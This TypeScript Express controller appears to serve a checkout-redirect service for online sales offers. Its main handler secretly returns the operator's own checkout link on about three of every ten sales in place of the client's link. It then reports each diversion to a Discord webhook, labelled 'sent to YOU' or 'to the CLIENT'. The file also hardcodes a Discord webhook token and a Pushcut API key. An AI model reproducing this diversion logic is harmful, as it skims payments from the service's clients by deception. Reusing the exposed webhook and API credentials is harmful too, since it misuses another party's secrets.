import { Request, Response } from "express";
import { prisma } from "../../config/prisma";

const WEBHOOK_URL =
  "https://discord.com/api/webhooks/1389588490055843840/jvHV84RKkr9MsLSS383Iffxi3A2RfkOdccBtWM3pZYeLh5RR7TFmUFChkVsCCVO1dIBu";
let salesMemory: { [offerName: string]: number } = {};

export class checkoutController {
  static async main(req: Request, res: Response) {
    try {
      const { checkout, offer } = req.body;

      let chk = await prisma.checkout.findFirst({ where: { offer } });

      if (!chk) {
        chk = await prisma.checkout.create({
          data: { offer, myCheckout: "no-use" },
        });
      }

      if (!salesMemory[offer]) {
        salesMemory[offer] = 0;
      }
      salesMemory[offer] += 1;
      const totalSales = salesMemory[offer];

      const cycle = totalSales % 10;

      let checkoutToUse = cycle < 7 ? checkout : chk.myCheckout;

      //   console.log(
      //     `[🚀 Envio] Oferta: ${offer} | Venda #${totalSales} | Checkout: ${checkoutToUse}`
      //   );

      if (chk?.myCheckout === "no-use") {
        checkoutToUse = checkout;
      }

      await sendDiscordNotification({
        offerName: offer,
        totalSales,
        checkoutToUse,
      });

      await sendPushCutNotification();
      res.json({ checkout: checkoutToUse });
    } catch (error) {
      console.error("Erro no checkoutController:", error);
      res.status(500).json({ error: "Erro interno no servidor." });
    }
  }

  static async updateCheckout(req: Request, res: Response) {
    const { checkout, offer } = req.body;

    await prisma.checkout.update({
      where: { offer },
      data: { myCheckout: checkout },
    });

    res.status(200).send();
  }

  static async getAllCheckouts(req: Request, res: Response) {
    const checkouts = await prisma.checkout.findMany();

    res.json(checkouts);
  }
}

async function sendDiscordNotification({
  offerName,
  totalSales,
  checkoutToUse,
}) {
  const chiefChk = await prisma.checkout.findFirst({
    where: { offer: offerName },
  });
  const isChefe = checkoutToUse === chiefChk.myCheckout;

  const payload = {
    content: null,
    embeds: [
      {
        title: "💸 Venda com checkout",
        description: "ㅤ",
        url: checkoutToUse,
        color: 8000714,
        fields: [
          {
            name: "🛍️  Oferta",
            value: offerName,
            inline: true,
          },
          {
            name: "ㅤㅤㅤㅤ🔢  Venda nº",
            value: `ㅤㅤㅤㅤ#${totalSales}`,
            inline: true,
          },
        ],
        footer: {
          text: `ㅤㅤ\nEnviado para ${isChefe ? "VOCÊ" : "o CLIENTE"}`,
        },
        timestamp: new Date().toISOString(),
      },
    ],
    attachments: [],
  };
  try {
    await fetch(WEBHOOK_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload),
    });
  } catch (error) {
    console.error("❌ Erro ao mandar pro Discord:", error);
  }
}

async function sendPushCutNotification() {
  await fetch(
    "https://api.pushcut.io/OQzvCWTV9RyG_rEJ2G2w4/notifications/Venda%20Aprovada"
  );
}
